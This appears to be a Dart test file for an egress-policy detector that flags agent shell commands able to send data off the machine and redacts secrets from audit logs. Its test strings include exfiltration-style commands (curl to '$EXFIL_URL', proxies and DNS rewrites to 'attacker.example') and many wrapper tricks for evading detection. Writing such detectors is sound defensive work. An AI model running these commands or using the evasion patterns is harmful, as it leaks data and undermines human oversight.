import 'package:flutter_test/flutter_test.dart';
import 'package:ianvs_acp/acp/acp_permission_request.dart';
import 'package:ianvs_acp/tasks/egress_policy.dart';

void main() {
  group('egress policy command detection', () {
    test('flags export-sensitive commands', () {
      const sensitiveCommands = [
        'git push origin main',
        'gh pr create --fill',
        'hub pull-request',
        'curl -X POST https://example.com/upload',
        'wget https://example.com/file',
        'scp file host:/tmp',
        'rsync -av out/ host:/tmp',
        'ssh host command',
      ];

      for (final command in sensitiveCommands) {
        expect(isEgressSensitiveCommand(command), isTrue, reason: command);
      }
    });

    test('does not flag local read-only commands', () {
      const localCommands = [
        'git status',
        'git diff',
        'git log',
        'rg "foo"',
        'flutter test',
      ];

      for (final command in localCommands) {
        expect(isEgressSensitiveCommand(command), isFalse, reason: command);
      }
    });

    test('detects commands nested in permission metadata', () {
      final match = egressPolicyMatchForPermission(
        AcpPermissionRequest(
          id: 'permission-1',
          title: 'Create terminal',
          rationale: 'Requested by agent.',
          sessionId: 'session-1',
          toolName: 'terminal',
          toolKind: 'execute',
          options: const ['allow', 'deny'],
          requestedAt: DateTime(2026, 7, 7, 8),
          metadata: const <String, Object?>{'command': 'git push origin main'},
        ),
      );

      expect(match?.reason, 'git_push');
      expect(match?.commandLine, 'git push origin main');
    });

    test('detects commands encoded in raw tool input', () {
      final match = egressPolicyMatchForPermission(
        AcpPermissionRequest(
          id: 'permission-1',
          title: 'Create terminal',
          rationale: 'Requested by agent.',
          sessionId: 'session-1',
          toolName: 'terminal',
          toolKind: 'execute',
          options: const ['allow', 'deny'],
          requestedAt: DateTime(2026, 7, 7, 8),
          metadata: const <String, Object?>{
            'rawInput': '{"command":"gh","args":["pr","create","--fill"]}',
          },
        ),
      );

      expect(match?.reason, 'pull_request');
      expect(match?.commandLine, 'gh pr create --fill');
    });

    test('detects commands in permission titles', () {
      final match = egressPolicyMatchForPermission(
        AcpPermissionRequest(
          id: 'permission-1',
          title: 'Run: scp file host:/tmp',
          rationale: 'Requested by agent.',
          sessionId: 'session-1',
          toolName: 'terminal',
          toolKind: 'execute',
          options: const ['allow', 'deny'],
          requestedAt: DateTime(2026, 7, 7, 8),
        ),
      );

      expect(match?.reason, 'external_transfer_command');
      expect(match?.commandLine, 'scp file host:/tmp');
    });

    test(
      'resolves URL variables from transient environment without exposure',
      () {
        const secretUrl = 'https://collector.example.com/private-token';
        final match = egressPolicyMatchForPermission(
          AcpPermissionRequest(
            id: 'permission-env',
            title: 'Create terminal',
            rationale: 'Requested by agent.',
            sessionId: 'session-1',
            toolName: 'terminal',
            toolKind: 'execute',
            options: const ['allow', 'deny'],
            requestedAt: DateTime(2026, 7, 7, 8),
            metadata: const <String, Object?>{
              'command': 'curl',
              'args': [r'$EXFIL_URL'],
              'envKeys': ['EXFIL_URL'],
            },
            transientPolicyContext: const <String, Object?>{
              'environment': <String, String>{'EXFIL_URL': secretUrl},
            },
          ),
        );

        expect(match?.reason, 'external_http_transfer');
        expect(match?.commandLine, contains(r'$EXFIL_URL'));
        expect(match?.commandLine, isNot(contains(secretUrl)));
      },
    );

    test('unwraps env and command wrappers before classifying egress', () {
      for (final command in const <String>[
        '/usr/bin/env curl https://example.com/private',
        'command wget https://example.com/archive',
      ]) {
        final match = egressSensitiveCommandMatch(command);
        expect(match?.reason, 'external_http_transfer', reason: command);
      }
    });

    test('accepts structured args and resolves braced variables', () {
      final match = egressSensitiveCommandMatch(
        '/usr/bin/env',
        args: const <String>['curl', r'${EXFIL_URL}'],
        cwd: '/workspace',
        environment: const <String, String>{
          'EXFIL_URL': 'https://example.com/private-secret',
        },
      );

      expect(match?.reason, 'external_http_transfer');
      expect(match?.commandLine, contains(r'${EXFIL_URL}'));
      expect(match?.commandLine, isNot(contains('private-secret')));
    });

    test('resolves inline assignments for wrapped commands', () {
      final match = egressSensitiveCommandMatch(
        r'EXFIL_URL=https://example.com/private curl $EXFIL_URL',
      );

      expect(match?.reason, 'external_http_transfer');
      expect(match?.commandLine, isNot(contains('/private')));
      expect(match?.commandLine, contains(r'$EXFIL_URL'));
    });

    test(
      'holds unknown wrappers and undefined variables for manual review',
      () {
        expect(
          egressSensitiveCommandMatch('env --mystery curl https://example.com'),
          isNotNull,
        );
        expect(
          egressSensitiveCommandMatch(r'$UNKNOWN_TOOL https://example.com'),
          isNotNull,
        );
        expect(egressSensitiveCommandMatch(r'curl $UNDEFINED_URL'), isNotNull);
      },
    );

    test('holds malformed shell syntax for manual review', () {
      for (final command in <String>[
        "echo 'unterminated",
        'echo "unterminated',
        "echo trailing\\",
      ]) {
        final match = egressSensitiveCommandMatch(command);
        expect(match?.reason, 'malformed_shell_syntax', reason: command);
      }
    });

    test('checks commands after newline and background separators', () {
      for (final command in const <String>[
        'git status & curl https://example.com/private',
        'git status\ncurl https://example.com/private',
        'git status\rcurl https://example.com/private',
      ]) {
        expect(
          egressSensitiveCommandMatch(command),
          isNotNull,
          reason: command,
        );
      }
      expect(
        egressSensitiveCommandMatch(
          'echo "quoted\ncurl https://example.com/private"',
        ),
        isNull,
      );
    });

    test(
      'holds command-launching wrappers without leaking environment URLs',
      () {
        const secretUrl = 'https://collector.example/private-secret';
        for (final command in const <String>[
          r'sudo curl $EXFIL_URL',
          r'nice -n 5 curl $EXFIL_URL',
          r'timeout 5 curl $EXFIL_URL',
          r'nohup curl $EXFIL_URL',
        ]) {
          final match = egressSensitiveCommandMatch(
            command,
            environment: const <String, String>{'EXFIL_URL': secretUrl},
          );
          expect(match, isNotNull, reason: command);
          expect(match?.reason, 'unresolved_wrapper', reason: command);
          expect(
            match?.commandLine,
            isNot(contains(secretUrl)),
            reason: command,
          );
        }
        expect(
          egressSensitiveCommandMatch('custom-tool curl README.md'),
          isNull,
        );
      },
    );

    test('holds unsupported shell expansions for manual review', () {
      for (final command in const <String>[
        r'$1 https://example.com',
        r'${CMD:-curl} https://example.com',
        r'echo ${VAR:?missing}',
        r'$(curl https://example.com/private)',
        r'`curl https://example.com/private`',
      ]) {
        final match = egressSensitiveCommandMatch(command);
        expect(match, isNotNull, reason: command);
        expect(match?.reason, 'unresolved_variable', reason: command);
      }
    });

    test('preserves literal dollars from single quotes and escapes', () {
      for (final command in const <String>[
        r"echo '$HOME'",
        r"rg '\$TOKEN' README.md",
        r'echo \$HOME',
        r'echo "\$HOME"',
        r"echo '`curl https://example.com/private`'",
      ]) {
        expect(egressSensitiveCommandMatch(command), isNull, reason: command);
      }

      expect(egressSensitiveCommandMatch(r'echo "$HOME"'), isNotNull);
      expect(
        egressSensitiveCommandMatch(
          r'echo "$HOME"',
          environment: const <String, String>{'HOME': '/workspace'},
        ),
        isNull,
      );
    });

    test(
      'parses curl and wget URL options without treating credentials as URLs',
      () {
        for (final command in const <String>[
          'curl --url=https://example.com/private',
          'curl --url https://example.com/private',
          'curl -u user:secret https://example.com/private',
          'wget --url=https://example.com/private',
          'curl example.com/private',
          'wget example.com/archive',
        ]) {
          expect(
            egressSensitiveCommandMatch(command),
            isNotNull,
            reason: command,
          );
        }
        for (final command in const <String>[
          'curl --url=http://localhost:8080/health',
          'curl -u user:secret http://127.0.0.1:8080/health',
          'curl -u user:secret',
          'curl localhost:8080/health',
          'wget 127.0.0.1:8080/archive',
          'curl [::1]:8080/health',
          'curl -o https://not-a-target.example/output',
          'curl -d https://not-a-target.example/body http://localhost/health',
          'curl -H https://not-a-target.example/header http://localhost/health',
          'curl --max-time 5 http://localhost/health',
          'curl --max-time=5 http://localhost/health',
          'curl -m5 http://localhost/health',
          'curl --cacert cert.pem',
          'curl --cacert=cert.pem',
          'curl --cookie jar',
          'curl --cookie=jar',
          'curl -bjar http://localhost/health',
        ]) {
          expect(egressSensitiveCommandMatch(command), isNull, reason: command);
        }
      },
    );

    test('holds curl transfer configs for manual review', () {
      for (final command in const <String>[
        'curl --config settings.txt',
        'curl --config=settings.txt',
        'curl -Ksettings.txt',
        'curl --config settings.txt http://localhost/health',
      ]) {
        expect(
          egressSensitiveCommandMatch(command)?.reason,
          'unresolved_transfer_config',
          reason: command,
        );
      }
    });

    test('classifies attached and detached network endpoint options', () {
      for (final command in const <String>[
        'curl --proxy=https://proxy.attacker.example http://localhost/health',
        'curl --proxy https://proxy.attacker.example http://localhost/health',
        'curl --doh-url=https://dns.attacker.example/dns-query http://localhost',
      ]) {
        expect(
          egressSensitiveCommandMatch(command),
          isNotNull,
          reason: command,
        );
      }
    });

    test('classifies curl endpoint rewrites by their actual destination', () {
      for (final command in const <String>[
        'curl --resolve=localhost:80:203.0.113.20 http://localhost',
        'curl --resolve localhost:80:attacker.example http://localhost',
        'curl --connect-to=localhost:80:attacker.example:443 http://localhost',
        'curl --connect-to localhost:80:attacker.example:443 http://localhost',
      ]) {
        expect(
          egressSensitiveCommandMatch(command),
          isNotNull,
          reason: command,
        );
      }
      for (final command in const <String>[
        'curl --resolve=localhost:80:127.0.0.1 http://localhost',
        'curl --connect-to=localhost:80:127.0.0.1:8080 http://localhost',
      ]) {
        expect(egressSensitiveCommandMatch(command), isNull, reason: command);
      }
    });

    test('holds subshell controls and unwraps exec commands', () {
      expect(
        egressSensitiveCommandMatch('(curl https://example.com/private)'),
        isNotNull,
      );
      expect(
        egressSensitiveCommandMatch('exec curl https://example.com/private'),
        isNotNull,
      );
      expect(egressSensitiveCommandMatch(r"echo '(curl safe)'"), isNull);
    });

    test('holds unsupported shell grammar and secondary launchers', () {
      for (final command in const <String>[
        '{ curl https://example.com/private; }',
        '! curl https://example.com/private',
        'if curl https://example.com/private; then echo ok; fi',
        'eval curl https://example.com/private',
        'time curl https://example.com/private',
        'xargs curl https://example.com/private',
        'parallel curl ::: https://example.com/private',
        'find . -exec curl https://example.com/private ;',
        'find . -okdir curl https://example.com/private ;',
      ]) {
        expect(
          egressSensitiveCommandMatch(command),
          isNotNull,
          reason: command,
        );
      }
      expect(egressSensitiveCommandMatch(r"echo '{ ! safe; }'"), isNull);
      expect(egressSensitiveCommandMatch('find . -name README.md'), isNull);
    });

    test('recurses through shell short option combinations containing c', () {
      for (final command in const <String>[
        "bash -ec 'curl https://example.com/private'",
        "sh -xc 'curl https://example.com/private'",
        "zsh -euxc 'curl https://example.com/private'",
        "bash -e -c 'curl https://example.com/private'",
        "bash -o errexit -c 'curl https://example.com/private'",
      ]) {
        expect(
          egressSensitiveCommandMatch(command),
          isNotNull,
          reason: command,
        );
      }
      expect(egressSensitiveCommandMatch("bash -ec 'echo safe'"), isNull);
      expect(
        egressSensitiveCommandMatch('bash --mystery echo safe'),
        isNotNull,
      );
      expect(egressSensitiveCommandMatch('bash -ec'), isNotNull);
      expect(egressSensitiveCommandMatch('bash script.sh'), isNotNull);
      expect(egressSensitiveCommandMatch('sh'), isNotNull);
    });

    test(
      'holds unquoted environment expansions that require field splitting',
      () {
        const environment = <String, String>{
          'CMD': 'curl https://example.com/private',
        };

        expect(
          egressSensitiveCommandMatch(r'$CMD', environment: environment),
          isNotNull,
        );
        expect(
          egressSensitiveCommandMatch(r'"$CMD"', environment: environment),
          isNull,
        );
      },
    );

    test('redacts credentials and URL secrets from audit command display', () {
      const secret = 'arbitrary-secret-value';
      final match = egressSensitiveCommandMatch(
        'curl -u alice:$secret '
        '--header="Authorization: Bearer $secret" '
        '--cookie=session=$secret '
        '--data=token=$secret '
        'https://alice:pw@example.com/upload?token=$secret#fragment',
      );

      expect(match, isNotNull);
      expect(match?.commandLine, isNot(contains(secret)));
      expect(match?.commandLine, isNot(contains('alice:pw')));
      expect(match?.commandLine, contains('<redacted>'));
      expect(match?.commandLine, contains('https://example.com/<redacted>'));
    });

    test('redacts bare URL and TLS credential option values', () {
      const secret = 'tls-option-secret';
      final match = egressSensitiveCommandMatch(
        'curl --tlspassword=$secret '
        '--proxy-tlspassword $secret '
        '--cert client.pem:$secret '
        'example.com/upload?token=$secret',
      );

      expect(match, isNotNull);
      expect(match?.commandLine, isNot(contains(secret)));
      expect(match?.commandLine, contains('example.com/<redacted>'));
    });

    test('redacts wget passwords and non-HTTP URL userinfo', () {
      const secret = 'scheme-userinfo-secret';
      for (final command in const <String>[
        'wget --password $secret '
            'ftp://alice:$secret@files.example/private',
        'curl --proxy=socks5://alice:$secret@proxy.example '
            'http://localhost/health',
      ]) {
        final match = egressSensitiveCommandMatch(command);
        expect(match, isNotNull, reason: command);
        expect(match?.commandLine, isNot(contains(secret)), reason: command);
        expect(match?.commandLine, isNot(contains('alice:')), reason: command);
      }
    });

    test('does not infer network egress from arbitrary argument words', () {
      expect(egressSensitiveCommandMatch('rg upload README.md'), isNull);
      expect(egressSensitiveCommandMatch('echo webhook'), isNull);
    });

    test('keeps safe adjacent commands unflagged', () {
      for (final command in const <String>[
        'env LANG=C git status',
        'command rg curl README.md',
        'EXAMPLE=value flutter test',
      ]) {
        expect(egressSensitiveCommandMatch(command), isNull, reason: command);
      }
    });
  });
}
